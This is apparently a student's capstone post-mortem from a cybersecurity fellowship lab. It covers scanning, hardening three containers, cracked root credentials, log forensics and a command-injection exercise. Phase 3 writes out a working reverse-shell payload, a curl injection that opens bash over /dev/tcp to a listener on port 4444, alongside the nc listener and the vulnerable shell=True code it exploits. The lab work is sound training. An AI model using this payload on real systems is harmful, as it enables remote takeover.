Phase 1 Final Reckoning — TEPP Post-Mortem

Operator: [Denis]
Date: May 30, 2026
Repository: [https://github.com/Denis-si/tkh_ifcs_p1.git]
TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity

## Phase 0: Reconnaissance

### Triage Network (172.100.0.0/24)

A network sweep of this subnet mapped out three active hosts:

* **172.100.0.11:** Port 6379 is open, revealing an unauthenticated Redis key-value store (v8.6.2).
* **172.100.0.12:** Port 21 is open, running an active vsftpd (v3.0.2) FTP service.
* **172.100.0.13:** No external TCP ports are exposed, indicating a hardened exterior or an internal-only deployment.

### Breach Network (172.80.0.0/24)

An initial Nmap ping sweep across this segment showed no active nodes beyond the gateway at `172.80.0.1`. Due to the complete lack of an external attack surface, this subnet was classified as inactive. No further perimeter exploitation was attempted here, shifting the tactical focus for lateral movement and credential-cracking entirely to the active targets found in the `172.100.0.x` range.

### Exploitation Network (172.60.0.0/24)

Target enumeration via Nmap ping scans confirmed that this subnet also contained zero active external servers. Because no live hosts or open network sockets were exposed on this segment, it was set aside to focus all subsequent discovery and exploitation efforts on the vulnerable `172.100.0.x` targets.

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11

Vulnerability Identified:
An unauthenticated Redis key-value store (v8.6.2) was found bound to all network interfaces on port 6379, verified by an Nmap scan of the host.

Remediation Commands:
sudo docker exec -it broken_server_1 sh
netstat -tlnp
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A INPUT -p tcp --dport 6379 -j DROP

Before State:
The containerized Redis database engine was configured to listen indiscriminately on port 6379 across all external interfaces without requiring authentication credentials.

After State:
A follow-up scan report confirmed that port 6379/tcp successfully transitioned from an open status to a filtered status.

Analysis:
An unauthenticated Redis database deployment within an enterprise network perimeter presents a severe vulnerability layer that amplifies the threat of lateral movement and full system compromise. The database engine executes commands natively without verifying access tokens, meaning attackers can manipulate critical application variables, extract memory datasets, or perform unauthorized administrative reconfigurations. Furthermore, if the server context possesses write permissions to the underlying host filesystem, attackers can abuse data-persistence functions to overwrite configuration folders, insert rogue SSH authorized keys, or plant arbitrary code execution web-shells that facilitate a complete operational takeover.

### Server 2 — 172.100.0.12

Vulnerability Identified:
A rogue FTP service was actively running on the target host, confirmed by an Nmap scan of the asset.

Remediation Commands:
sudo docker exec -it broken_server_2 sh
pkill vsftpd
sudo docker rm broken_server_2

Before State:
A rogue instance of the vsftpd (v3.0.2) application layer was running inside the broken_server_2 container, exposing ports 20 and 21 to the local network architecture.

After State:
Following the termination and removal of the container, a follow-up Nmap scan of the target host resulted in zero active services or hosts detected.

Analysis:
An enterprise network environment containing a rogue FTP service exposes the organization to severe risks, such as the protocol transmitting all session authentication handles and raw payloads over the network in cleartext format. Malicious attackers can easily harvest administrative credentials using basic packet-sniffing utilities to exfiltrate data. The presence of rogue software compromises compliance frameworks and establishes unmonitored backdoors that bypass centralized access controls.

### Server 3 — 172.100.0.13

Vulnerability Identified:
The web application root directory /var/www/html was misconfigured with dangerous, world-writable 777 permissions.

Remediation Commands:
sudo docker exec -it broken_server_3 sh
cd /var/www
chmod 755 html

Before State:
Prior to remediation, the web application deployment root directory /var/www/html was left world-writable (777). This permitted any local user or compromised service account on the system to inject, modify, or erase application source code payloads.

After State:
Following the execution of the chmod adjustment, the web root folder was successfully locked down to standard baseline security settings (755). Under this configuration, the owner retains read, write, and execute permissions, while all other users are strictly restricted to reading and executing only.

Analysis:
Leaving deployment or web root paths world-writable (777) introduces severe systemic risk by opening direct pathways for local privilege escalation and persistent code injection. If an attacker leverages a vulnerability in a separate application to gain a low-privileged foothold on the asset, they can exploit this permission leak to plant web shells or modify operational binaries. Restricting filesystem nodes using strict directory baseline controls enforces the Principle of Least Privilege and preserves environment integrity.

## Phase 2: The Breach

Cracked Credentials:
Username: root
Password: admin123

Forensic Evidence:
Exact Timestamp of Successful Login: N/A (no timestamp recorded in the log file)
Attacker IP Address: 172.80.0.2 (originating from port 47336)

Engineered iptables Rule:
iptables -A INPUT -s 172.80.0.2 -j DROP

SOC Analysis:
Relying on a single iptables rule offers insufficient standalone protection because network-level filtering cannot remediate root architectural flaws like weak authentication credentials or overly permissive access controls. A robust Security Operations Center must deploy a multi-layered defense-in-depth framework to mitigate these risks effectively. This strategy includes enforcing multi-factor authentication (MFA) and transition to public-key infrastructure (PKI) to completely remove the threat of password-based entry. Additionally, deploying host-based intrusion prevention systems (HIPS) to automatically throttle brute-force connection attempts and establishing automated SIEM log correlation rules will ensure security teams detect and flag early anomalous traffic patterns before a perimeter breach occurs.
## Phase 3: Full Spectrum

Listener Configuration:
Tool: Netcat (nc)
Port: 4444
Command used: nc -lvnp 4444

Reverse Shell Payload:
curl -sL "http://172.60.0.10/exec?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/172.60.0.1/4444%200%3E%261'"

Command Injection Explanation:
Command injection vulnerabilities occur when an application passes unsafe user-supplied inputs directly to a system shell execution context without checking for dangerous characters. The target application is susceptible to this flaw because server.py extracts parameters straight from the query string using self.path.split('cmd=')[1] and passes the unquoted value directly into subprocess.Popen(cmd, shell=True). Because shell=True invokes an underlying operating system shell, metacharacters such as semicolons or input redirection operators run natively rather than processing as literal string arguments (OWASP Foundation, 2026).
Forensic Evidence:
Process ID (PID): [~/Capstone_Logs/access.log]
User-Agent: [~/Capstone_Logs/access.log]
Lockdown Command:
iptables -A INPUT -p tcp --dport 80 -m string --algo bm --string "cmd=" -j DROP

Final Analytical Paragraph:
Executing this full-spectrum operation from both perspectives underscores that perimeter defenses are deeply flawed if underlying internal software handles raw inputs unsafely. Simulating the attack highlights how easily systemic trust is broken when web backends expose subshell privileges, allowing simple external parameters to trigger interactive system takeover vectors. To neutralize this threat vector permanently before an exploit attempt occurs, implementing strict code-level input validation using a strict white-list pattern is the single most essential defensive control. Validating all parameters against a precise alphanumeric schema or utilizing native Python dictionary maps instead of invoking raw shell execution processes stops command injection completely, rendering external string manipulation entirely harmless regardless of network visibility or endpoint access permissions (OWASP Foundation, 2026).

## References
OWASP Foundation. (2026). Code injection vulnerabilities and parameterization rules. https://owasp.org
